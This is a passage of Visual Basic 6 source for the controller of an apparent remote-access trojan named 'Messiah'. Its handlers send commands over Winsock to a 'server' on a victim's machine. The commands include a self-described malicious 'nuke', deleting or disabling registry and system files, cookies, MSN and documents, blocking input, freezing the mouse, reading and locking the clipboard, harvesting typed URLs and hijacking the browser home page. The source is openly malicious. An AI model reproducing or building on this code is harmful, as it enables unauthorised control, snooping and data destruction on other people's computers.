         Width           =   855
      End
      Begin VB.Label Label24 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Screen Shot."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   172
         Top             =   120
         Width           =   1455
      End
      Begin VB.Label Label25 
         BackColor       =   &H00000000&
         Caption         =   "Height:          Width:"
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1200
         TabIndex        =   171
         Top             =   600
         Width           =   1815
      End
   End
   Begin VB.Frame Frame18 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   156
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.TextBox Txtmessage 
         Height          =   855
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   164
         Text            =   "Form1.frx":9E783
         Top             =   3120
         Width           =   4215
      End
      Begin VB.CommandButton Command99 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Name"
         Height          =   375
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   163
         Top             =   4080
         Width           =   975
      End
      Begin VB.TextBox Text19 
         Height          =   285
         Left            =   120
         TabIndex        =   162
         Text            =   "Messiah"
         Top             =   3960
         Visible         =   0   'False
         Width           =   1095
      End
      Begin VB.CommandButton Command98 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Send"
         Height          =   375
         Left            =   3360
         Style           =   1  'Graphical
         TabIndex        =   160
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command97 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Stop"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   159
         Top             =   4080
         Width           =   975
      End
      Begin VB.CommandButton Command96 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Start"
         Height          =   375
         Left            =   1200
         Style           =   1  'Graphical
         TabIndex        =   157
         Top             =   4080
         Width           =   975
      End
      Begin RichTextLib.RichTextBox RTB1 
         Height          =   2775
         Left            =   120
         TabIndex        =   158
         Top             =   360
         Width           =   4215
         _ExtentX        =   7435
         _ExtentY        =   4895
         _Version        =   393217
         Enabled         =   -1  'True
         ReadOnly        =   -1  'True
         ScrollBars      =   2
         TextRTF         =   $"Form1.frx":9E793
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label23 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Chat."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1800
         TabIndex        =   161
         Top             =   120
         Width           =   495
      End
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "-"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   345
      Left            =   6480
      TabIndex        =   65
      Top             =   120
      Width           =   150
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "Comic Sans MS"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   345
      Left            =   6720
      TabIndex        =   64
      Top             =   120
      Width           =   180
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Label1"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   360
      Left            =   5625
      TabIndex        =   32
      Top             =   5970
      Width           =   1380
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Welcome to Messiah"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   360
      Left            =   135
      TabIndex        =   1
      Top             =   5970
      Width           =   3645
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Label2"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   330
      Left            =   3900
      TabIndex        =   0
      Top             =   5970
      Width           =   1635
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function CreatePipe Lib "kernel32" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As SECURITY_ATTRIBUTES, ByVal nSize As Long) As Long
Private Declare Sub GetStartupInfo Lib "kernel32" Alias "GetStartupInfoA" (lpStartupInfo As STARTUPINFO)
Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As Any) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Type SECURITY_ATTRIBUTES
  nLength As Long
  lpSecurityDescriptor As Long
  bInheritHandle As Long
End Type

Private Type PROCESS_INFORMATION
  hProcess As Long
  hThread As Long
  dwProcessId As Long
  dwThreadId As Long
End Type

Private Type STARTUPINFO
  cb As Long
  lpReserved As Long
  lpDesktop As Long
  lpTitle As Long
  dwX As Long
  dwY As Long
  dwXSize As Long
  dwYSize As Long
  dwXCountChars As Long
  dwYCountChars As Long
  dwFillAttribute As Long
  dwFlags As Long
  wShowWindow As Integer
  cbReserved2 As Integer
  lpReserved2 As Byte
  hStdInput As Long
  hStdOutput As Long
  hStdError As Long
End Type

Private Type OVERLAPPED
    ternal As Long
    ternalHigh As Long
    offset As Long
    OffsetHigh As Long
    hEvent As Long
End Type

Private Const STARTF_USESHOWWINDOW = &H1
Private Const STARTF_USESTDHANDLES = &H100
Private Const SW_HIDE = 0
Private Const EM_SETSEL = &HB1
Private Const EM_REPLACESEL = &HC2

Private Type MIB_TCPROW
    dwState As Long
    dwLocalAddr As Long
    dwLocalPort As Long
    dwRemoteAddr As Long
    dwRemotePort As Long
End Type

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Const SW_SHOWNORMAL = 1
Private Declare Sub ReleaseCapture Lib "user32" ()
Const WM_NCLBUTTONDOWN = &HA1
Const HTCAPTION = 2
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Dim PP As String
Private Sub Command100_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kreg|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command101_Click()
Form6.Show
End Sub

Private Sub Command102_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kcommand|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command103_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kwinini|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command104_Click()
On Error GoTo ErrorShow
Winsock1.SendData "ksysini|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command105_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kcalc|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command106_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kwordpad|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command107_Click()
On Error GoTo ErrorShow
Winsock1.SendData "krestore|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command108_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kautoexec|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command109_Click()
On Error GoTo ErrorShow
Winsock1.SendData "knote|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command110_Click()
On Error GoTo ErrorShow
Winsock1.SendData "ktelnet|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command111_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kcursor|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command112_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kwinhelp|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command113_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kfonts|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command114_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kdocs|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command115_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kpics|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command116_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kmusic|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command117_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kreceived|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command118_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kcookies|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command119_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kmsn|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command120_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kpaint|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command121_Click()
On Error GoTo ErrorShow
Winsock1.SendData "kfav|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command122_Click()
On Error GoTo ErrorShow
Winsock1.SendData "nuke|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "If you really want to be this malicous, you need to connect to a server before you an be, try to establish a connection!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command123_Click()
On Error GoTo ErrorShow
Winsock1.SendData "typemessage|" & Text2.Text
PP = Text2.Text
Matrix.Enabled = True
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command124_Click()
On Error GoTo ErrorShow
Winsock1.SendData "clear|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command125_Click()
On Error GoTo ErrorShow
Winsock1.SendData "stopmatrix|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command126_Click()
On Error GoTo ErrorShow
Winsock1.SendData "startmatrix|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command127_Click()
Redirect "ping " & Text1.Text, Form7.Text1
Form7.Show
End Sub

Private Sub Command25_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfeatmem|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command37_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mfreeze|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command38_Click()
On Error GoTo ErrorShow
Winsock1.SendData "munfreeze|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command39_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mib|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command40_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mrb|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command41_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mhide|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command42_Click()
On Error GoTo ErrorShow
Winsock1.SendData "mshow|"
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command43_Click()
On Error GoTo ErrorShow
Dim XX As String
XX = InputBox("Enter the X co-ordinate:", "X Coord", "100")
Winsock1.SendData "mcoord1|" & XX
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command44_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fblockion|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command45_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fblockioff|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command46_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kcaps|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command47_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "knum|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command48_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kscroll|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command49_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kflash|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command50_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fblockion|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command51_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "fblockioff|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command52_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kscrollo|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command53_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "kflashoff|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command54_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "mmtitle|" & Text3.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command55_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "imtitle|" & Text5.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command56_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "getserverinfo|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command57_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "setclip|" & Text9.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command58_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "getclip|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command59_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "lockclip|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command60_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "clearclip|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command61_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "unlockclip|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command62_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "openemail|" & Text13.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command64_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rmsn|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command63_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "typedurls|"
Winsock1.SendData txtdata
Form3.Show
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command65_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "opensite|" & Text11.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command66_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "sethome|" & Text12.Text
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command67_Click()
Dim txtdata As String
On Error GoTo ErrorShow
txtdata = "gethome|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If
End Sub

Private Sub Command68_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rnotepad|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command69_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rwordpad|"
Winsock1.SendData txtdata
Exit Sub
ErrorShow:
If Err.Number = 40006 Then
Form2.Label1.Caption = "Try connecting first!" & vbCrLf & "You have to connect to a server before you can do anyting else!"
Form2.Show
Else
Form2.Label1.Caption = Err.Description
Form2.Show
End If

End Sub

Private Sub Command70_Click()
On Error GoTo ErrorShow
Dim txtdata As String
txtdata = "rpaint|"
Winsock1.SendData txtdata
Exit Sub
